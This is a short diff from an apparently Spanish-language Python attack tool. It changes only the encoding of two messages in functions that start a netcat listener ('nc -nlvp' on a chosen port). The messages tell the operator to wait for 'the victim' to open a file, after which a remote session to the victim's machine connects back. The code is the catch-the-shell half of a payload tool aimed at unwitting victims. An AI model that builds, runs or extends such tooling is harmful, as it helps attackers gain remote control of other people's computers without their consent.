@@ -28,14 +28,14 @@ def clearScr():
 
 def option_listener_yes(): 
      clearScr()
-     print(""+ rojo +"No cierre esta terminal, cuando la victima habra el archivo se habrÃ¡ conectado a la maquina remotamente."+ fin +"")
+     print(""+ rojo +"No cierre esta terminal, cuando la victima habra el archivo se habra conectado a la maquina remotamente."+ fin +"")
      print(""+ negrita +"UNA VEZ REALIZADA UNA SESION PONGA EL SIGUIENTE COMANDO EN LA TERMINAL > "+ comentarios +" <"+ negrita +" para utilizar la interfaz de comandos")
      os.system('nc -nlvp '+ puerto +'') 
 
 
 def option_listener_yes2():
     clearScr()
-    print(""+ rojo +"No cierre esta terminal, cuando la victima habra el archivo se habrÃ¡ conectado a la maquina remotamente."+ fin +"")
+    print(""+ rojo +"No cierre esta terminal, cuando la victima habra el archivo se habra conectado a la maquina remotamente."+ fin +"")
     os.system('nc -nlvp '+ puerto +'')
 
 clearScr()
